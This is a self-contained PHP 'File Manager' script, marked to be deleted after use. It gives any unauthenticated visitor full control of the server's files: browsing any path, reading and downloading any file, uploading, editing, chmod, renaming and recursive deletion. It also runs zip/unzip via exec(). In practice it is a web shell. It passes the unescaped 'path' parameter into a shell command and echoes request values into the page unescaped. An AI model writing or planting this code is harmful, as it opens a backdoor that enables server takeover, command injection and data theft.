<?php
/* ############################# */
/* File Manager */
/* TO BE DELETED AFTER USE */
/* ############################# */
/* Add, modify files and folders in a directory */
/* ############################# */

set_time_limit(0);
error_reporting(0);

echo '<!DOCTYPE HTML>
<html>
<head>
<style>
body {font-family: monospace;background-color: #ffffff;}
.petit {font-size:.8em;}
#content tr:hover {background-color: #008580;text-shadow:0px 0px 10px #ffffff;}
#content .first {background-color: #008580;}
#content .first:hover {background-color: #008580;text-shadow:0px 0px 1px #ffffff;}
table {border: 1px #008580 dotted;}
a {color: mediumblue;text-decoration: none;}
a:hover {color: #fff;text-shadow:0px 0px 10px #ffffff;}
input,select,textarea {border: 1px #000000 solid;border-radius:5px;}
.milieu {display: block;margin:0 auto;}
.centre {text-align:center;}
</style>
</head>
<body>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>File path >>  ';
if (isset($_GET['path'])) {
	$path = $_GET['path'];
}
else {
	$path = getcwd();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

foreach ($paths as $id => $pat) {
	if ($pat == '' && $id == 0) {
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if ($pat == '') continue;
	echo '<a href="?path=';
	for ($i = 0;$i <= $id;$i++) {
		echo "$paths[$i]";
		if ($i != $id) echo "/";
	}
	echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_FILES['file'])) {
	if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
		echo '<font color="green">Upload successful!</font><br>';
	}
	else {
		echo '<font color="crimson"><strong>Upoload failed!</strong></font><br>';
	}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload a file <input type="file" name="file">
<input type="submit" value="Send">
</form>';

if (isset($_POST['dossier'])) {
	$nomDossier = $_POST['dossier'];
	$nomDossier = str_replace(' ', '_', $nomDossier);
	$nomDossier = preg_replace('/[^a-zA-Z0-9\/_-]/', '', $nomDossier);
	if (file_exists($nomDossier)) {
		echo '<font color="crimson"><strong>Existing folder</strong></font><br>';
	}
	if (mkdir($nomDossier, 0755)) {
		echo '<font color="green">Adding folder successful!</font><br>';
	}
	else {
		echo '<font color="crimson"><strong>Add folder failed!</strong></font><br>';
	}
}
echo '<form method="POST">
Create a <strong>folder</strong> with absolute path <input type="text" name="dossier" value="' . realpath($path) . '/name-directory/">
<input type="submit" value="Save">
</form>';

if (isset($_POST['creafichier'])) {
	$creaFichier = $_POST['creafichier'];
	$creaFichier = str_replace(' ', '_', $creaFichier);
	$creaFichier = preg_replace('/[^a-zA-Z0-9\/\._-]/', '', $creaFichier);
	if (file_exists($creaFichier)) {
		echo '<font color="crimson"><strong>Existing file</strong></font><br>';
	}
	if (!file_exists($creaFichier)) {
		$anse = fopen($creaFichier,'c+'); $ducontenu='Sample content'; fwrite($anse,$ducontenu); fclose($anse);
		echo '<font color="green">Adding file successful!</font><br>';
	}
	else {
		echo '<font color="crimson"><strong>Add file failed!</strong></font><br>';
	}
}
echo '<form method="POST">
Create a <em>file</em> with absolute path <input type="text" name="creafichier" value="' . realpath($path) . '/file.txt">
<input type="submit" value="Save">
</form>';

echo '<br><br>' . php_uname() . '
</td></tr>';

if (isset($_GET['filesrc']) && isset($_GET['telechargefichier'])) { telFichBin($_GET['filesrc']); }
elseif (isset($_GET['filesrc'])) {
	echo "<tr><td>Files >> ";
	echo $_GET['filesrc'];
	echo '</td></tr></table><br>';
	$ext_fich = substr(strrchr($_GET['filesrc'],'.'),1);
	$media_ext_liste = array('jpg','png','gif','ico','pdf','mp3','wav','webp','heic','heif','mp4','mov','hevf','av1');
	$binaire_ext_liste = array('zip','gz','doc','docx','xls','xlsx','ppt','pptx','odt','ods','odp','rtf','pages','numbers','key');
	if(in_array($ext_fich , $media_ext_liste)) { echo '<p><form method="POST" action="?filesrc='.$_GET['filesrc'].'&path='.$path.'&telechargefichier=1"><input class="milieu" type="submit" value="Download the file"></form></p><iframe class="milieu" width="700" height="700" src="' .cheminWeb($_GET['filesrc']). '"></iframe>'; }
	elseif(in_array($ext_fich , $binaire_ext_liste)) { telFichBin($_GET['filesrc']); }
	else {echo '<p><form method="POST" action="?filesrc='.$_GET['filesrc'].'&path='.$path.'&telechargefichier=1"><input class="milieu" type="submit" value="Download the file"></form></p><pre>' . htmlspecialchars(file_get_contents($_GET['filesrc']), ENT_QUOTES, 'UTF-8') . '</pre>';}
}
elseif (isset($_GET['option']) && ($_POST['opt'] == 'chmod'||$_POST['opt'] == 'rename'||$_POST['opt'] == 'move'||$_POST['opt'] == 'edit')) {
	echo '</table><p class="centre milieu">' . $_POST['path'] . '<br><br>';
	if ($_POST['opt'] == 'chmod') {
		if (isset($_POST['perm'])) {
			if (chmod($_POST['path'], intval($_POST['perm'],8))) {
				echo '<font color="green">Change permission successful!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Change permission failed!</strong></font><br>';
			}
		}
		echo '<form class="centre milieu" method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])) , -4) . '">
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Save">
</form>
<p class="centre">WARNING, octal notation, enter the 4 digits as follows 0644 or 0705.</p>';
	}
	elseif ($_POST['opt'] == 'rename') {
		if (isset($_POST['newname'])) {
			if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
				echo '<font color="green">Name change succeeded!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Name change failed!</strong></font><br>';
			}
			$_POST['name'] = $_POST['newname'];
		}
		echo '<form class="centre milieu" method="POST">
New name : <input name="newname" type="text" size="30" value="' . $_POST['name'] . '">
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Save">
</form>';
	}
	elseif ($_POST['opt'] == 'move') {
		if (isset($_POST['deplace'])) {
			if (rename($_POST['path'], $_POST['deplace'])) {
				echo '<font color="green">Moving the file successful!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Moving the file failed!</strong></font><br>';
			}
			$_POST['path'] = $_POST['deplace'];
		}
		echo '<form class="centre milieu" method="POST">
Move the file to : <input name="deplace" type="text" size="30" value="' . $path . '/' . $_POST['name'] . '">
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="move">
<input type="submit" value="Save">
</form>
<p class="centre">WARNING, put the absolute path with the file or folder name.</p>';
	}
	elseif ($_POST['opt'] == 'edit') {
		if (isset($_POST['src'])) {
			$fp = fopen($_POST['path'], 'w');
			if (fwrite($fp, $_POST['src'])) {
				echo '<font color="green">Editing successful!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Editing failed!</strong></font><br>';
			}
			fclose($fp);
		}
		echo '<form class="centre milieu" method="POST">
<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path']), ENT_QUOTES, 'UTF-8') . '</textarea><br>
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save">
</form>';
	}
	echo '</p>';
}
else {
	echo '</table><br><p class="milieu centre">';
	if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
		if ($_POST['type'] == 'dir') {
			foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($_POST['path'], 
				FilesystemIterator::SKIP_DOTS | FilesystemIterator::UNIX_PATHS), 
				RecursiveIteratorIterator::CHILD_FIRST) as $value) {
				$value->isFile() ? unlink($value) : rmdir($value);
			}
			if (rmdir($_POST['path'])) {
				echo '<font color="green">Delete successful!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Delete failed!</strong></font><br>';
			}
		}
		elseif ($_POST['type'] == 'file') {
			if (unlink($_POST['path'])) {
				echo '<font color="green">Delete file successful!</font><br>';
			}
			else {
				echo '<font color="crimson"><strong>Delete file failed!</strong></font><br>';
			}
		}
	}
	elseif (isset($_GET['option']) && $_POST['opt'] == 'zip') {
		$ficCompress = escapeshellcmd($_POST['path']);
		exec("zip -qr -6 ".$ficCompress.".zip ".$ficCompress."");
		echo '<font color="green">Compression successful!</font><br>';
		}
	elseif (isset($_GET['option']) && $_POST['opt'] == 'unzip') {
		$extFic = new SplFileInfo($_POST['path']);
		if ($extFic->getExtension() == 'zip') {
			$ficCompress = escapeshellcmd($_POST['path']);
			exec("unzip -q ".$ficCompress." -d ".$path."");
			echo '<font color="green">Uncompression successful!</font><br>';
			}
		else {
			echo '<font color="crimson"><strong>Uncompression failed! You need a ZIP file</strong></font><br>';
			}
		} 
	echo '</p>';
	$scandir = scandir($path);
	echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td class="centre">Name</td>
<td class="centre">Size</td>
<td class="centre">Permissions</td>
<td class="centre">Actions</td>
</tr>';

	foreach ($scandir as $dir) {
		if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
		echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td class=\"petit centre\">--</td>
<td class=\"petit centre\">";
		if (is_writable("$path/$dir")) echo '<font color="green">';
		elseif (!is_readable("$path/$dir")) echo '<font color="crimson">';
		echo perms("$path/$dir");
		if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

		echo "</td>
<td class=\"centre\"><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"What to do?\">What to do?</option>
<option value=\"rename\">Rename</option>
<option value=\"move\">Move</option>
<option value=\"chmod\">Chmod</option>
<option value=\"zip\">Compress</option>
<option value=\"unzip\">Uncompress</option>
<option value=\"delete\">Delete</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\">
</form></td>
</tr>";
	}
	echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
	foreach ($scandir as $file) {
		if (!is_file("$path/$file")) continue;
		$size = filesize("$path/$file") / 1024;
		$size = round($size, 2);
		if ($size >= 1024) {
			$size = round($size / 1024, 2) . ' Mo';
		}
		else {
			$size = $size . ' Ko';
		}

		echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td class=\"petit centre\">" . $size . "</td>
<td class=\"petit centre\">";
		if (is_writable("$path/$file")) echo '<font color="green">';
		elseif (!is_readable("$path/$file")) echo '<font color="crimson">';
		echo perms("$path/$file");
		if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
		echo "</td>
<td class=\"centre\"><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"What to do?\">What to do?</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
<option value=\"move\">Move</option>
<option value=\"chmod\">Chmod</option>
<option value=\"zip\">Compress</option>
<option value=\"unzip\">Uncompress</option>
<option value=\"delete\">Delete</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\">
</form></td>
</tr>";
	}
	echo '</table>
</div>';
}
echo '
</body>
</html>';
function perms($file) {
	$perms = fileperms($file);

	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	}
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	}
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	}
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	}
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	}
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	}
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	}
	else {
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

	return $info;
}
function telFichBin($telfich){
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($telfich).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($telfich));
	ob_clean();
	flush();
	readfile($telfich);
	exit;
}
function cheminWeb($fich) {
  $document_racine = rtrim(preg_replace("#([\\\\/]+)#", '/', $_SERVER['DOCUMENT_ROOT']), '/');
  $fich = preg_replace("#([\\\\/]+)#", '/', realpath($fich));
  return preg_replace("#^($document_racine)#", '', $fich);
}
?>